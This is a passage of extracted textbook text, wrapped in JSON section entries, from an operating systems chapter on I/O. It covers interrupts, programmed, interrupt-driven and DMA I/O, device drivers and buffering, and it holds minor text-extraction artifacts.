executed\r\n20% executed\r\n35% executed\r\n40% executed\r\n10% executed\r\nFully executed\r\nNot executed\r\n320\r\n324\r\n328\r\n332\r\n300\r\n304\r\n308\r\n312\r\n316\r\n320\r\n324\r\n328\r\n332\r\nFigure 5-6. (a) A precise interrupt. (b) An imprecise interrupt.\r\nAn interrupt that does not meet these requirements is called an imprecise int\u0002errupt and makes life most unpleasant for the operating system writer, who now\r\nhas to figure out what has happened and what still has to happen. Fig. 5-6(b) illus\u0002trates an imprecise interrupt, where different instructions near the program counter\r\nare in different stages of completion, with older ones not necessarily more com\u0002plete than younger ones. Machines with imprecise interrupts usually vomit a large\r\namount of internal state onto the stack to give the operating system the possibility\r\nof figuring out what was going on. The code necessary to restart the machine is\r\ntypically exceedingly complicated. Also, saving a large amount of information to\r\nmemory on every interrupt makes interrupts slow and recovery even worse. This\r\nleads to the ironic situation of having very fast superscalar CPUs sometimes being\r\nunsuitable for real-time work due to slow interrupts.\r\nSome computers are designed so that some kinds of interrupts and traps are\r\nprecise and others are not. For example, having I/O interrupts be precise but traps\r\ndue to fatal programming errors be imprecise is not so bad since no attempt need\r\nbe made to restart a running process after it has divided by zero. Some machines\r\nhave a bit that can be set to force all interrupts to be precise. The downside of set\u0002ting this bit is that it forces the CPU to carefully log everything it is doing and\r\nmaintain shadow copies of registers so it can generate a precise interrupt at any in\u0002stant. All this overhead has a major impact on performance.\r\nSome superscalar machines, such as the x86 family, hav e precise interrupts to\r\nallow old software to work correctly. The price paid for backward compatibility\r\nwith precise interrupts is extremely complex interrupt logic within the CPU to\r\nmake sure that when the interrupt controller signals that it wants to cause an inter\u0002rupt, all instructions up to some point are allowed to finish and none beyond that\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 351\r\npoint are allowed to have any noticeable effect on the machine state. Here the price\r\nis paid not in time, but in chip area and in complexity of the design. If precise in\u0002terrupts were not required for backward compatibility purposes, this chip area\r\nwould be available for larger on-chip caches, making the CPU faster. On the other\r\nhand, imprecise interrupts make the operating system far more complicated and\r\nslower, so it is hard to tell which approach is really better."
          }
        }
      },
      "5.2 PRINCIPLES OF I/O SOFTWARE": {
        "page": 382,
        "children": {
          "5.2.1 Goals of the I/O Software": {
            "page": 382,
            "content": "5.2.1 Goals of the I/O Software\r\nA key concept in the design of I/O software is known as device independence.\r\nWhat it means is that we should be able to write programs that can access any I/O\r\ndevice without having to specify the device in advance. For example, a program\r\nthat reads a file as input should be able to read a file on a hard disk, a DVD, or on a\r\nUSB stick without having to be modified for each different device. Similarly, one\r\nshould be able to type a command such as\r\nsor t <input >output\r\nand have it work with input coming from any kind of disk or the keyboard and the\r\noutput going to any kind of disk or the screen. It is up to the operating system to\r\ntake care of the problems caused by the fact that these devices really are different\r\nand require very different command sequences to read or write.\r\nClosely related to device independence is the goal of uniform naming. The\r\nname of a file or a device should simply be a string or an integer and not depend on\r\nthe device in any way. In UNIX, all disks can be integrated in the file-system hier\u0002archy in arbitrary ways so the user need not be aware of which name corresponds\r\nto which device. For example, a USB stick can be mounted on top of the directory\r\n/usr/ast/backup so that copying a file to /usr/ast/backup/monday copies the file to\r\nthe USB stick. In this way, all files and devices are addressed the same way: by a\r\npath name.\r\nAnother important issue for I/O software is error handling. In general, errors\r\nshould be handled as close to the hardware as possible. If the controller discovers\r\na read error, it should try to correct the error itself if it can. If it cannot, then the\r\ndevice driver should handle it, perhaps by just trying to read the block again. Many\r\nerrors are transient, such as read errors caused by specks of dust on the read head,\r\nand will frequently go away if the operation is repeated. Only if the lower layers\n352 INPUT/OUTPUT CHAP. 5\r\nare not able to deal with the problem should the upper layers be told about it. In\r\nmany cases, error recovery can be done transparently at a low lev el without the\r\nupper levels even knowing about the error.\r\nStill another important issue is that of synchronous (blocking) vs. asyn\u0002chronous (interrupt-driven) transfers. Most physical I/O is asynchronous—the\r\nCPU starts the transfer and goes off to do something else until the interrupt arrives.\r\nUser programs are much easier to write if the I/O operations are blocking—after a\r\nread system call the program is automatically suspended until the data are avail\u0002able in the buffer. It is up to the operating system to make operations that are ac\u0002tually interrupt-driven look blocking to the user programs. However, some very\r\nhigh-performance applications need to control all the details of the I/O, so some\r\noperating systems make asynchronous I/O available to them.\r\nAnother issue for the I/O software is buffering. Often data that come off a de\u0002vice cannot be stored directly in their final destination. For example, when a packet\r\ncomes in off the network, the operating system does not know where to put it until\r\nit has stored the packet somewhere and examined it. Also, some devices have\r\nsevere real-time constraints (for example, digital audio devices), so the data must\r\nbe put into an output buffer in advance to decouple the rate at which the buffer is\r\nfilled from the rate at which it is emptied, in order to avoid buffer underruns. Buff\u0002ering involves considerable copying and often has a major impact on I/O per\u0002formance.\r\nThe final concept that we will mention here is sharable vs. dedicated devices.\r\nSome I/O devices, such as disks, can be used by many users at the same time. No\r\nproblems are caused by multiple users having open files on the same disk at the\r\nsame time. Other devices, such as printers, have to be dedicated to a single user\r\nuntil that user is finished. Then another user can have the printer. Having two or\r\nmore users writing characters intermixed at random to the same page will defi\u0002nitely not work. Introducing dedicated (unshared) devices also introduces a variety\r\nof problems, such as deadlocks. Again, the operating system must be able to hanfle\r\nboth shared and dedicated devices in a way that avoids problems."
          },
          "5.2.2 Programmed I/O": {
            "page": 383,
            "content": "5.2.2 Programmed I/O\r\nThere are three fundamentally different ways that I/O can be performed. In\r\nthis section we will look at the first one (programmed I/O). In the next two sec\u0002tions we will examine the others (interrupt-driven I/O and I/O using DMA). The\r\nsimplest form of I/O is to have the CPU do all the work. This method is called pro\u0002grammed I/O.\r\nIt is simplest to illustrate how programmed I/O works by means of an example.\r\nConsider a user process that wants to print the eight-character string ‘‘ABCDE\u0002FGH’’ on the printer via a serial interface. Displays on small embedded systems\r\nsometimes work this way. The software first assembles the string in a buffer in\r\nuser space, as shown in Fig. 5-7(a).\nSEC. 5.2 PRINCIPLES OF I/O SOFTWARE 353\r\nString to\r\nUser be printed\r\nspace\r\nKernel\r\nspace\r\nABCD\r\nEFGH\r\nPrinted\r\npage\r\n(a)\r\nABCD\r\nEFGH\r\nABCD\r\nEFGH\r\nPrinted\r\npage\r\n(b)\r\nA Next\r\n(c)\r\nAB Next\r\nFigure 5-7. Steps in printing a string.\r\nThe user process then acquires the printer for writing by making a system call\r\nto open it. If the printer is currently in use by another process, this call will fail\r\nand return an error code or will block until the printer is available, depending on\r\nthe operating system and the parameters of the call. Once it has the printer, the user\r\nprocess makes a system call telling the operating system to print the string on the\r\nprinter.\r\nThe operating system then (usually) copies the buffer with the string to an\r\narray, say, p, in kernel space, where it is more easily accessed (because the kernel\r\nmay have to change the memory map to get at user space). It then checks to see if\r\nthe printer is currently available. If not, it waits until it is. As soon as the printer is\r\navailable, the operating system copies the first character to the printer’s data regis\u0002ter, in this example using memory-mapped I/O. This action activates the printer.\r\nThe character may not appear yet because some printers buffer a line or a page be\u0002fore printing anything. In Fig. 5-7(b), however, we see that the first character has\r\nbeen printed and that the system has marked the ‘‘B’’ as the next character to be\r\nprinted.\r\nAs soon as it has copied the first character to the printer, the operating system\r\nchecks to see if the printer is ready to accept another one. Generally, the printer has\r\na second register, which gives its status. The act of writing to the data register\r\ncauses the status to become not ready. When the printer controller has processed\r\nthe current character, it indicates its availability by setting some bit in its status reg\u0002ister or putting some value in it.\r\nAt this point the operating system waits for the printer to become ready again.\r\nWhen that happens, it prints the next character, as shown in Fig. 5-7(c). This loop\r\ncontinues until the entire string has been printed. Then control returns to the user\r\nprocess.\r\nThe actions followed by the operating system are briefly summarized in\r\nFig. 5-8. First the data are copied to the kernel. Then the operating system enters a\n354 INPUT/OUTPUT CHAP. 5\r\ntight loop, outputting the characters one at a time. The essential aspect of program\u0002med I/O, clearly illustrated in this figure, is that after outputting a character, the\r\nCPU continuously polls the device to see if it is ready to accept another one. This\r\nbehavior is often called polling or busy waiting.\r\ncopy from user(buffer, p, count); /* p is the ker nel buffer */\r\nfor (i = 0; i < count; i++) { /* loop on every character */\r\nwhile (*pr inter status reg != READY) ; /* loop until ready */\r\n*pr inter data register = p[i]; /* output one character */\r\n}\r\nretur n to user( );\r\nFigure 5-8. Writing a string to the printer using programmed I/O.\r\nProgrammed I/O is simple but has the disadvantage of tying up the CPU full time\r\nuntil all the I/O is done. If the time to ‘‘print’’ a character is very short (because all\r\nthe printer is doing is copying the new character to an internal buffer), then busy\r\nwaiting is fine. Also, in an embedded system, where the CPU has nothing else to\r\ndo, busy waiting is fine. However, in more complex systems, where the CPU has\r\nother work to do, busy waiting is inefficient. A better I/O method is needed."
          },
          "5.2.3 Interrupt-Driven I/O": {
            "page": 385,
            "content": "5.2.3 Interrupt-Driven I/O\r\nNow let us consider the case of printing on a printer that does not buffer char\u0002acters but prints each one as it arrives. If the printer can print, say 100 charac\u0002ters/sec, each character takes 10 msec to print. This means that after every charac\u0002ter is written to the printer’s data register, the CPU will sit in an idle loop for 10\r\nmsec waiting to be allowed to output the next character. This is more than enough\r\ntime to do a context switch and run some other process for the 10 msec that would\r\notherwise be wasted.\r\nThe way to allow the CPU to do something else while waiting for the printer to\r\nbecome ready is to use interrupts. When the system call to print the string is made,\r\nthe buffer is copied to kernel space, as we showed earlier, and the first character is\r\ncopied to the printer as soon as it is willing to accept a character. At that point the\r\nCPU calls the scheduler and some other process is run. The process that asked for\r\nthe string to be printed is blocked until the entire string has printed. The work done\r\non the system call is shown in Fig. 5-9(a).\r\nWhen the printer has printed the character and is prepared to accept the next\r\none, it generates an interrupt. This interrupt stops the current process and saves its\r\nstate. Then the printer interrupt-service procedure is run. A crude version of this\r\ncode is shown in Fig. 5-9(b). If there are no more characters to print, the interrupt\r\nhandler takes some action to unblock the user. Otherwise, it outputs the next char\u0002acter, acknowledges the interrupt, and returns to the process that was running just\r\nbefore the interrupt, which continues from where it left off.\nSEC. 5.2 PRINCIPLES OF I/O SOFTWARE 355\r\ncopy from user(buffer, p, count); if (count == 0) {\r\nenable interr upts( ); unblock user( );\r\nwhile (*pr inter status reg != READY) ; } else {\r\n*pr inter data register = p[0]; *pr inter data register = p[i];\r\nscheduler( ); count = count − 1;\r\ni = i + 1;\r\n}\r\nacknowledge interr upt( );\r\nretur n from interr upt( );\r\n(a) (b)\r\nFigure 5-9. Writing a string to the printer using interrupt-driven I/O. (a) Code\r\nexecuted at the time the print system call is made. (b) Interrupt service procedure\r\nfor the printer."
          },
          "5.2.4 I/O Using DMA": {
            "page": 386,
            "content": "5.2.4 I/O Using DMA\r\nAn obvious disadvantage of interrupt-driven I/O is that an interrupt occurs on\r\nev ery character. Interrupts take time, so this scheme wastes a certain amount of\r\nCPU time. A solution is to use DMA. Here the idea is to let the DMA controller\r\nfeed the characters to the printer one at time, without the CPU being bothered. In\r\nessence, DMA is programmed I/O, only with the DMA controller doing all the\r\nwork, instead of the main CPU. This strategy requires special hardware (the DMA\r\ncontroller) but frees up the CPU during the I/O to do other work. An outline of the\r\ncode is given in Fig. 5-10.\r\ncopy from user(buffer, p, count); acknowledge interr upt( );\r\nset up DMA controller( ); unblock user( );\r\nscheduler( ); retur n from interr upt( );\r\n(a) (b)\r\nFigure 5-10. Printing a string using DMA. (a) Code executed when the print\r\nsystem call is made. (b) Interrupt-service procedure.\r\nThe big win with DMA is reducing the number of interrupts from one per\r\ncharacter to one per buffer printed. If there are many characters and interrupts are\r\nslow, this can be a major improvement. On the other hand, the DMA controller is\r\nusually much slower than the main CPU. If the DMA controller is not capable of\r\ndriving the device at full speed, or the CPU usually has nothing to do anyway\r\nwhile waiting for the DMA interrupt, then interrupt-driven I/O or even pro\u0002grammed I/O may be better. Most of the time, though, DMA is worth it.\n356 INPUT/OUTPUT CHAP. 5"
          }
        }
      },
      "5.3 I/O SOFTWARE LAYERS": {
        "page": 387,
        "children": {
          "5.3.1 Interrupt Handlers": {
            "page": 387,
            "content": "5.3.1 Interrupt Handlers\r\nWhile programmed I/O is occasionally useful, for most I/O, interrupts are an\r\nunpleasant fact of life and cannot be avoided. They should be hidden away, deep in\r\nthe bowels of the operating system, so that as little of the operating system as pos\u0002sible knows about them. The best way to hide them is to have the driver starting an\r\nI/O operation block until the I/O has completed and the interrupt occurs. The driver\r\ncan block itself, for example, by doing a down on a semaphore, a wait on a condi\u0002tion variable, a receive on a message, or something similar.\r\nWhen the interrupt happens, the interrupt procedure does whatever it has to in\r\norder to handle the interrupt. Then it can unblock the driver that was waiting for it.\r\nIn some cases it will just complete up on a semaphore. In others it will do a signal\r\non a condition variable in a monitor. In still others, it will send a message to the\r\nblocked driver. In all cases the net effect of the interrupt will be that a driver that\r\nwas previously blocked will now be able to run. This model works best if drivers\r\nare structured as kernel processes, with their own states, stacks, and program\r\ncounters.\r\nOf course, reality is not quite so simple. Processing an interrupt is not just a\r\nmatter of taking the interrupt, doing an up on some semaphore, and then executing\r\nan IRET instruction to return from the interrupt to the previous process. There is a\r\ngreat deal more work involved for the operating system. We will now giv e an out\u0002line of this work as a series of steps that must be performed in software after the\r\nhardware interrupt has completed. It should be noted that the details are highly\nSEC. 5.3 I/O SOFTWARE LAYERS 357\r\nsystem dependent, so some of the steps listed below may not be needed on a partic\u0002ular machine, and steps not listed may be required. Also, the steps that do occur\r\nmay be in a different order on some machines.\r\n1. Save any registers (including the PSW) that have not already been\r\nsaved by the interrupt hardware.\r\n2. Set up a context for the interrupt-service procedure. Doing this may\r\ninvolve setting up the TLB, MMU and a page table.\r\n3. Set up a stack for the interrupt service-procedure.\r\n4. Acknowledge the interrupt controller. If there is no centralized inter\u0002rupt controller, reenable interrupts.\r\n5. Copy the registers from where they were saved (possibly some stack)\r\nto the process table.\r\n6. Run the interrupt-service procedure. It will extract information from\r\nthe interrupting device controller’s registers.\r\n7. Choose which process to run next. If the interrupt has caused some\r\nhigh-priority process that was blocked to become ready, it may be\r\nchosen to run now.\r\n8. Set up the MMU context for the process to run next. Some TLB set\u0002up may also be needed.\r\n9. Load the new process’ registers, including its PSW.\r\n10. Start running the new process.\r\nAs can be seen, interrupt processing is far from trivial. It also takes a considerable\r\nnumber of CPU instructions, especially on machines in which virtual memory is\r\npresent and page tables have to be set up or the state of the MMU stored (e.g., the\r\nR and M bits). On some machines the TLB and CPU cache may also have to be\r\nmanaged when switching between user and kernel modes, which takes additional\r\nmachine cycles."
          },
          "5.3.2 Device Drivers": {
            "page": 388,
            "content": "5.3.2 Device Drivers\r\nEarlier in this chapter we looked at what device controllers do. We saw that\r\neach controller has some device registers used to give it commands or some device\r\nregisters used to read out its status or both. The number of device registers and the\r\nnature of the commands vary radically from device to device. For example, a\r\nmouse driver has to accept information from the mouse telling it how far it has\r\nmoved and which buttons are currently depressed. In contrast, a disk driver may\n358 INPUT/OUTPUT CHAP. 5\r\nhave to know all about sectors, tracks, cylinders, heads, arm motion, motor drives,\r\nhead settling times, and all the other mechanics of making the disk work properly.\r\nObviously, these drivers will be very different.\r\nConsequently, each I/O device attached to a computer needs some device-spe\u0002cific code for controlling it. This code, called the device driver, is generally writ\u0002ten by the device’s manufacturer and delivered along with the device. Since each\r\noperating system needs its own drivers, device manufacturers commonly supply\r\ndrivers for several popular operating systems.\r\nEach device driver normally handles one device type, or at most, one class of\r\nclosely related devices. For example, a SCSI disk driver can usually handle multi\u0002ple SCSI disks of different sizes and different speeds, and perhaps a SCSI Blu-ray\r\ndisk as well. On the other hand, a mouse and joystick are so different that different\r\ndrivers are usually required. However, there is no technical restriction on having\r\none device driver control multiple unrelated devices. It is just not a good idea in\r\nmost cases.\r\nSometimes though, wildly different devices are based on the same underlying\r\ntechnology. The best-known example is probably USB, a serial bus technology that\r\nis not called ‘‘universal’’ for nothing. USB devices include disks, memory sticks,\r\ncameras, mice, keyboards, mini-fans, wireless network cards, robots, credit card\r\nreaders, rechargeable shavers, paper shredders, bar code scanners, disco balls, and\r\nportable thermometers. They all use USB and yet they all do very different things.\r\nThe trick is that USB drivers are typically stacked, like a TCP/IP stack in networks.\r\nAt the bottom, typically in hardware, we find the USB link layer (serial I/O) that\r\nhandles hardware stuff like signaling and decoding a stream of signals to USB\r\npackets. It is used by higher layers that deal with the data packets and the common\r\nfunctionality for USB that is shared by most devices. On top of that, finally, we\r\nfind the higher-layer APIs such as the interfaces for mass storage, cameras, etc.\r\nThus, we still have separate device drivers, even though they share part of the pro\u0002tocol stack.\r\nIn order to access the device’s hardware, actually, meaning the controller’s reg\u0002isters, the device driver normally has to be part of the operating system kernel, at\r\nleast with current architectures. Actually, it is possible to construct drivers that run\r\nin user space, with system calls for reading and writing the device registers. This\r\ndesign isolates the kernel from the drivers and the drivers from each other, elimi\u0002nating a major source of system crashes—buggy drivers that interfere with the ker\u0002nel in one way or another. For building highly reliable systems, this is definitely\r\nthe way to go. An example of a system in which the device drivers run as user\r\nprocesses is MINIX 3 (www.minix3.org). However, since most other desktop oper\u0002ating systems expect drivers to run in the kernel, that is the model we will consider\r\nhere.\r\nSince the designers of every operating system know that pieces of code (driv\u0002ers) written by outsiders will be installed in it, it needs to have an architecture that\r\nallows such installation. This means having a well-defined model of what a driver\nSEC. 5.3 I/O SOFTWARE LAYERS 359\r\ndoes and how it interacts with the rest of the operating system. Device drivers are\r\nnormally positioned below the rest of the operating system, as is illustrated in\r\nFig. 5-12.\r\nUser\r\nspace\r\nKernel\r\nspace\r\nUser process\r\nUser\r\nprogram\r\nRest of the operating system\r\nPrinter\r\ndriver\r\nCamcorder\r\ndriver\r\nCD-ROM\r\ndriver\r\nHardware Printer controller\r\nDevices\r\nCamcorder controller CD-ROM controller\r\nFigure 5-12. Logical positioning of device drivers. In reality all communication\r\nbetween drivers and device controllers goes over the bus.\r\nOperating systems usually classify drivers into one of a small number of cate\u0002gories. The most common categories are the block devices, such as disks, which\r\ncontain multiple data blocks that can be addressed independently, and the charac\u0002ter devices, such as keyboards and printers, which generate or accept a stream of\r\ncharacters.\r\nMost operating systems define a standard interface that all block drivers must\r\nsupport and a second standard interface that all character drivers must support.\r\nThese interfaces consist of a number of procedures that the rest of the operating\r\nsystem can call to get the driver to do work for it. Typical procedures are those to\r\nread a block (block device) or write a character string (character device).\r\nIn some systems, the operating system is a single binary program that contains\r\nall of the drivers it will need compiled into it. This scheme was the norm for years\n360 INPUT/OUTPUT CHAP. 5\r\nwith UNIX systems because they were run by computer centers and I/O devices\r\nrarely changed. If a new device was added, the system administrator simply re\u0002compiled the kernel with the new driver to build a new binary.\r\nWith the advent of personal computers, with their myriad I/O devices, this\r\nmodel no longer worked. Few users are capable of recompiling or relinking the\r\nkernel, even if they hav e the source code or object modules, which is not always\r\nthe case. Instead, operating systems, starting with MS-DOS, went over to a model\r\nin which drivers were dynamically loaded into the system during execution. Dif\u0002ferent systems handle loading drivers in different ways.\r\nA device driver has several functions. The most obvious one is to accept\r\nabstract read and write requests from the device-independent software above it and\r\nsee that they are carried out. But there are also a few other functions they must per\u0002form. For example, the driver must initialize the device, if needed. It may also\r\nneed to manage its power requirements and log events.\r\nMany device drivers have a similar general structure. A typical driver starts\r\nout by checking the input parameters to see if they are valid. If not, an error is re\u0002turned. If they are valid, a translation from abstract to concrete terms may be need\u0002ed. For a disk driver, this may mean converting a linear block number into the\r\nhead, track, sector, and cylinder numbers for the disk’s geometry.\r\nNext the driver may check if the device is currently in use. If it is, the request\r\nwill be queued for later processing. If the device is idle, the hardware status will\r\nbe examined to see if the request can be handled now. It may be necessary to\r\nswitch the device on or start a motor before transfers can be begun. Once the de\u0002vice is on and ready to go, the actual control can begin.\r\nControlling the device means issuing a sequence of commands to it. The driver\r\nis the place where the command sequence is determined, depending on what has to\r\nbe done. After the driver knows which commands it is going to issue, it starts writ\u0002ing them into the controller’s device registers. After each command is written to\r\nthe controller, it may be necessary to check to see if the controller accepted the\r\ncommand and is prepared to accept the next one. This sequence continues until all\r\nthe commands have been issued. Some controllers can be given a linked list of\r\ncommands (in memory) and told to read and process them all by itself without fur\u0002ther help from the operating system.\r\nAfter the commands have been issued, one of two situations will apply. In\r\nmany cases the device driver must wait until the controller does some work for it,\r\nso it blocks itself until the interrupt comes in to unblock it. In other cases, howev\u0002er, the operation finishes without delay, so the driver need not block. As an ex\u0002ample of the latter situation, scrolling the screen requires just writing a few bytes\r\ninto the controller’s registers. No mechanical motion is needed, so the entire oper\u0002ation can be completed in nanoseconds.\r\nIn the former case, the blocked driver will be awakened by the interrupt. In the\r\nlatter case, it will never go to sleep. Either way, after the operation has been com\u0002pleted, the driver must check for errors. If everything is all right, the driver may\nSEC. 5.3 I/O SOFTWARE LAYERS 361\r\nhave some data to pass to the device-independent software (e.g., a block just read).\r\nFinally, it returns some status information for error reporting back to its caller. If\r\nany other requests are queued, one of them can now be selected and started. If\r\nnothing is queued, the driver blocks waiting for the next request.\r\nThis simple model is only a rough approximation to reality. Many factors make\r\nthe code much more complicated. For one thing, an I/O device may complete\r\nwhile a driver is running, interrupting the driver. The interrupt may cause a device\r\ndriver to run. In fact, it may cause the current driver to run. For example, while the\r\nnetwork driver is processing an incoming packet, another packet may arrive. Con\u0002sequently, drivers have to be reentrant, meaning that a running driver has to\r\nexpect that it will be called a second time before the first call has completed.\r\nIn a hot-pluggable system, devices can be added or removed while the com\u0002puter is running. As a result, while a driver is busy reading from some device, the\r\nsystem may inform it that the user has suddenly removed that device from the sys\u0002tem. Not only must the current I/O transfer be aborted without damaging any ker\u0002nel data structures, but any pending requests for the now-vanished device must also\r\nbe gracefully removed from the system and their callers given the bad news. Fur\u0002thermore, the unexpected addition of new devices may cause the kernel to juggle\r\nresources (e.g., interrupt request lines), taking old ones away from the driver and\r\ngiving it new ones in their place.\r\nDrivers are not allowed to make system calls, but they often need to interact\r\nwith the rest of the kernel. Usually, calls to certain kernel procedures are permitted.\r\nFor example, there are usually calls to allocate and deallocate hardwired pages of\r\nmemory for use as buffers. Other useful calls are needed to manage the MMU,\r\ntimers, the DMA controller, the interrupt controller, and so on."
          },
          "5.3.3 Device-Independent I/O Software": {
            "page": 392,
            "content": "5.3.3 Device-Independent I/O Software\r\nAlthough some of the I/O software is device specific, other parts of it are de\u0002vice independent. The exact boundary between the drivers and the device-indepen\u0002dent software is system (and device) dependent, because some functions that could\r\nbe done in a device-independent way may actually be done in the drivers, for ef\u0002ficiency or other reasons. The functions shown in Fig. 5-13 are typically done in\r\nthe device-independent software.\r\nUnifor m interfacing for device drivers\r\nBuffer ing\r\nError reporting\r\nAllocating and releasing dedicated devices\r\nProviding a device-independent block size\r\nFigure 5-13. Functions of the device-independent I/O software.\n362 INPUT/OUTPUT CHAP. 5\r\nThe basic function of the device-independent software is to perform the I/O\r\nfunctions that are common to all devices and to provide a uniform interface to the\r\nuser-level software. We will now look at the above issues in more detail.\r\nUniform Interfacing for Device Drivers\r\nA major issue in an operating system is how to make all I/O devices and driv\u0002ers look more or less the same. If disks, printers, keyboards, and so on, are all in\u0002terfaced in different ways, every time a new device comes along, the operating sys\u0002tem must be modified for the new device. Having to hack on the operating system\r\nfor each new device is not a good idea.\r\nOne aspect of this issue is the interface between the device drivers and the rest\r\nof the operating system. In Fig. 5-14(a) we illustrate a situation in which each de\u0002vice driver has a different interface to the operating system. What this means is that\r\nthe driver functions available for the system to call differ from driver to driver. It\r\nmight also mean that the kernel functions that the driver needs also differ from\r\ndriver to driver. Taken together, it means that interfacing each new driver requires a\r\nlot of new programming effort.\r\nOperating system Operating system\r\nSATA disk driver USB disk driver SCSI disk driver SATA disk driver USB disk driver SCSI disk driver\r\n(a) (b)\r\nFigure 5-14. (a) Without a standard driver interface. (b) With a standard driver\r\ninterface.\r\nIn contrast, in Fig. 5-14(b), we show a different design in which all drivers\r\nhave the same interface. Now it becomes much easier to plug in a new driver, pro\u0002viding it conforms to the driver interface. It also means that driver writers know\r\nwhat is expected of them. In practice, not all devices are absolutely identical, but\r\nusually there are only a small number of device types and even these are generally\r\nalmost the same.\r\nThe way this works is as follows. For each class of devices, such as disks or\r\nprinters, the operating system defines a set of functions that the driver must supply.\r\nFor a disk these would naturally include read and write, but also turning the power\nSEC. 5.3 I/O SOFTWARE LAYERS 363\r\non and off, formatting, and other disky things. Often the driver holds a table with\r\npointers into itself for these functions. When the driver is loaded, the operating\r\nsystem records the address of this table of function pointers, so when it needs to\r\ncall one of the functions, it can make an indirect call via this table. This table of\r\nfunction pointers defines the interface between the driver and the rest of the operat\u0002ing system. All devices of a given class (disks, printers, etc.) must obey it.\r\nAnother aspect of having a uniform interface is how I/O devices are named.\r\nThe device-independent software takes care of mapping symbolic device names\r\nonto the proper driver. For example, in UNIX a device name, such as /dev/disk0,\r\nuniquely specifies the i-node for a special file, and this i-node contains the major\r\ndevice number, which is used to locate the appropriate driver. The i-node also\r\ncontains the minor device number, which is passed as a parameter to the driver in\r\norder to specify the unit to be read or written. All devices have major and minor\r\nnumbers, and all drivers are accessed by using the major device number to select\r\nthe driver.\r\nClosely related to naming is protection. How does the system prevent users\r\nfrom accessing devices that they are not entitled to access? In both UNIX and\r\nWindows, devices appear in the file system as named objects, which means that the\r\nusual protection rules for files also apply to I/O devices. The system administrator\r\ncan then set the proper permissions for each device.\r\nBuffering\r\nBuffering is also an issue, both for block and character devices, for a variety of\r\nreasons. To see one of them, consider a process that wants to read data from an\r\n(ADSL—Asymmetric Digital Subscriber Line) modem, something many people\r\nuse at home to connect to the Internet. One possible strategy for dealing with the\r\nincoming characters is to have the user process do a read system call and block\r\nwaiting for one character. Each arriving character causes an interrupt. The inter\u0002rupt-service procedure hands the character to the user process and unblocks it.\r\nAfter putting the character somewhere, the process reads another character and\r\nblocks again. This model is indicated in Fig. 5-15(a).\r\nThe trouble with this way of doing business is that the user process has to be\r\nstarted up for every incoming character. Allowing a process to run many times for\r\nshort runs is inefficient, so this design is not a good one.\r\nAn improvement is shown in Fig. 5-15(b). Here the user process provides an\r\nn-character buffer in user space and does a read of n characters. The interrupt-ser\u0002vice procedure puts incoming characters in this buffer until it is completely full.\r\nOnly then does it wakes up the user process. This scheme is far more efficient than\r\nthe previous one, but it has a drawback: what happens if the buffer is paged out\r\nwhen a character arrives? The buffer could be locked in memory, but if many\r\nprocesses start locking pages in memory willy nilly, the pool of available pages\r\nwill shrink and performance will degrade.\n364 INPUT/OUTPUT CHAP. 5\r\nUser process\r\nUser\r\nspace\r\nKernel\r\nspace\r\n2 2\r\n1 13\r\nModem Modem Modem Modem\r\n(a) (b) (c) (d)\r\nFigure 5-15. (a) Unbuffered input. (b) Buffering in user space. (c) Buffering in\r\nthe kernel followed by copying to user space. (d) Double buffering in the kernel.\r\nYet another approach is to create a buffer inside the kernel and have the inter\u0002rupt handler put the characters there, as shown in Fig. 5-15(c). When this buffer is\r\nfull, the page with the user buffer is brought in, if needed, and the buffer copied\r\nthere in one operation. This scheme is far more efficient.\r\nHowever, even this improved scheme suffers from a problem: What happens to\r\ncharacters that arrive while the page with the user buffer is being brought in from\r\nthe disk? Since the buffer is full, there is no place to put them. A way out is to\r\nhave a second kernel buffer. After the first buffer fills up, but before it has been\r\nemptied, the second one is used, as shown in Fig. 5-15(d). When the second buffer\r\nfills up, it is available to be copied to the user (assuming the user has asked for it).\r\nWhile the second buffer is being copied to user space, the first one can be used for\r\nnew characters. In this way, the two buffers take turns: while one is being copied\r\nto user space, the other is accumulating new input. A buffering scheme like this is\r\ncalled double buffering.\r\nAnother common form of buffering is the circular buffer. It consists of a re\u0002gion of memory and two pointers. One pointer points to the next free word, where\r\nnew data can be placed. The other pointer points to the first word of data in the\r\nbuffer that has not been removed yet. In many situations, the hardware advances\r\nthe first pointer as it adds new data (e.g., just arriving from the network) and the\r\noperating system advances the second pointer as it removes and processes data.\r\nBoth pointers wrap around, going back to the bottom when they hit the top.\r\nBuffering is also important on output. Consider, for example, how output is\r\ndone to the modem without buffering using the model of Fig. 5-15(b). The user\r\nprocess executes a wr ite system call to output n characters. The system has two\r\nchoices at this point. It can block the user until all the characters have been writ\u0002ten, but this could take a very long time over a slow telephone line. It could also\r\nrelease the user immediately and do the I/O while the user computes some more,\nSEC. 5.3 I/O SOFTWARE LAYERS 365\r\nbut this leads to an even worse problem: how does the user process know that the\r\noutput has been completed and it can reuse the buffer? The system could generate\r\na signal or software interrupt, but that style of programming is difficult and prone\r\nto race conditions. A much better solution is for the kernel to copy the data to a\r\nkernel buffer, analogous to Fig. 5-15(c) (but the other way), and unblock the caller\r\nimmediately. Now it does not matter when the actual I/O has been completed. The\r\nuser is free to reuse the buffer the instant it is unblocked.\r\nBuffering is a widely used technique, but it has a downside as well. If data get\r\nbuffered too many times, performance suffers. Consider, for example, the network\r\nof Fig. 5-16. Here a user does a system call to write to the network. The kernel\r\ncopies the packet to a kernel buffer to allow the user to proceed immediately (step\r\n1). At this point the user program can reuse the buffer.\r\n2\r\n1 5\r\n4\r\n3\r\nUser process\r\nNetwork\r\nNetwork\r\ncontroller\r\nUser\r\nspace\r\nKernel\r\nspace\r\nFigure 5-16. Networking may involve many copies of a packet.\r\nWhen the driver is called, it copies the packet to the controller for output (step\r\n2). The reason it does not output to the wire directly from kernel memory is that\r\nonce a packet transmission has been started, it must continue at a uniform speed.\r\nThe driver cannot guarantee that it can get to memory at a uniform speed because\r\nDMA channels and other I/O devices may be stealing many cycles. Failing to get a\r\nword on time would ruin the packet. By buffering the packet inside the controller,\r\nthis problem is avoided.\r\nAfter the packet has been copied to the controller’s internal buffer, it is copied\r\nout onto the network (step 3). Bits arrive at the receiver shortly after being sent, so\r\njust after the last bit has been sent, that bit arrives at the receiver, where the packet\r\nhas been buffered in the controller. Next the packet is copied to the receiver’s ker\u0002nel buffer (step 4). Finally, it is copied to the receiving process’ buffer (step 5).\r\nUsually, the receiver then sends back an acknowledgement. When the sender gets\r\nthe acknowledgement, it is free to send the next packet. However, it should be\r\nclear that all this copying is going to slow down the transmission rate considerably\r\nbecause all the steps must happen sequentially.\n366 INPUT/OUTPUT CHAP. 5\r\nError 